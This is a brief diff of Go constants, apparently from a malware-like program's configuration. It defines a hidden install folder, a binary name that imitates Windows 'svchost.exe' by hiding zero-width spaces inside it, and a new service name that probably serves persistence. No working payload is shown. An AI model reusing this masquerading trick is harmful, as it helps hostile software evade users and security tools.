@@ -7,8 +7,9 @@ const (
 	GenesisText = "Genesis"
 	Interval    = 5
 
-	Base   = "$userprofile\\Saved Games\\.hydra"
-	Binary = "s\u200bvch\u200bost.exe"
+	Base    = "$userprofile\\Saved Games\\.hydra"
+	Binary  = "s\u200bvch\u200bost.exe"
+	Service = "Memserv2"
 )
 
 var (
